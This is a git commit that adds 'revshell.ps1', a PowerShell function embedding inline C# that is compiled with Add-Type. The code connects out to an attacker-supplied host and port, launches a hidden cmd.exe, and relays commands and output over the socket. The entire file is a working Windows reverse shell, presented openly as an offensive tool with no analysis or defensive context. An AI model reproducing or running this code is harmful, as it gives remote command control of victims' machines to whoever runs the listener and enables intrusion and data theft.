370010438d5e863bad3bcd746e8f5eae9f0dda89
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2019-12-20 14:30:32 +0100

    Create revshell.ps1

---
+++ PowershellScripts/revshell.ps1
@@ -0,0 +1,85 @@
+function revshell{
+
+Param
+    (
+        [string]
+        $lhost,
+	    [string]
+        $lport
+	)
+
+
+$Source = @"
+using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+
+
+namespace Connect
+{
+	public class rev
+	{
+		static StreamWriter streamWriter;
+
+		public static void to(params string[] args)
+		{
+			using(TcpClient client = new TcpClient(args[0], int.Parse(args[1])))
+			{
+				using(Stream stream = client.GetStream())
+				{
+					using(StreamReader rdr = new StreamReader(stream))
+					{
+						streamWriter = new StreamWriter(stream);
+						
+						StringBuilder strInput = new StringBuilder();
+
+						Process p = new Process();
+						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.CreateNoWindow = true;
+						p.StartInfo.UseShellExecute = false;
+						p.StartInfo.RedirectStandardOutput = true;
+						p.StartInfo.RedirectStandardInput = true;
+						p.StartInfo.RedirectStandardError = true;
+						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.Start();
+						p.BeginOutputReadLine();
+
+						while(true)
+						{
+							strInput.Append(rdr.ReadLine());
+							//strInput.Append("\n");
+							p.StandardInput.WriteLine(strInput);
+							strInput.Remove(0, strInput.Length);
+						}
+					}
+				}
+			}
+		}
+
+		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception) { }
+            }
+        }
+
+	}
+}
+"@;
+Add-Type -TypeDefinition $Source -Language CSharp;
+[Connect.rev]::to("$lhost","$lport")
+}
